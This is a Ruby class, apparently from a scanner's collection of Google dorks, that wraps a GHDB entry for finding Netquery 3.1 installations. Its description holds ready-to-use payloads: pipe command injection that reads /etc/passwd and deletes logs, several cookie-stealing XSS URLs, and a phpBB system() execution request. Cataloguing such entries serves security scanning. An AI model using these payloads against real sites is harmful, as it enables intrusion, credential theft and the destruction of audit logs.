module Dorks
   class Dork1054 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1054",
            ghdb_url: "https://www.exploit-db.com/ghdb/1054",
            severity: "3",
            category: "vulnerable_files",
            publish_date: "2005-08-07",
            author: "anonymous",
            dork: <<~EDORK,
inurl:nquser.php filetype:php
EDORK
            description: <<~EDESC
Netquery 3.1 remote commands execution, cross site scripting, information disclosure poc exploit software: author site: http://www.virtech.org/tools/ a user can execute command on target system by PING panel, if enabled like often happens, using pipe char on input text "Ping IP Address or Host Name", example: | cat /etc/passwd then you will see plain text password file | pwd to see current path | rm [pwd_output]/logs/nq_log.txt to delete log file... disclosure of user activity: if enabled, a user can view clear text log file through url: http://[target]/[path]/logs/nq_log.txt xss: http://[target]/[path]/submit.php?portnum="/&gt;alert(document.cookie) http://[target]/[path]/nqgeoip2.php?step=alert(document.cookie) http://[target]/[path]/nqgeoip2.php?body=alert(document.cookie) http://[target]/[path]/nqgeoip.php?step=alert(document.cookie) http://[target]/[path]/nqports.php?step=alert(document.cookie) http://[target]/[path]/nqports2.php?step=alert(document.cookie) http://[target]/[path]/nqports2.php?body=alert(document.cookie) http://[target]/[path]/portlist.php?portnum=alert(document.cookie) a user can use on-line Netquery installations like proxy servers to launch exploit from HTTP GET request panel, example: exploiting Phpbb 2.0.15: make a get request of http://[vulnerable_server]/[path]/viewtopic.php?t=[existing_topic]&highlight='.system($HTTP_GET_VARS[command].'&command=cat%20/etc/passwd
EDESC
         })

      end
   end
end
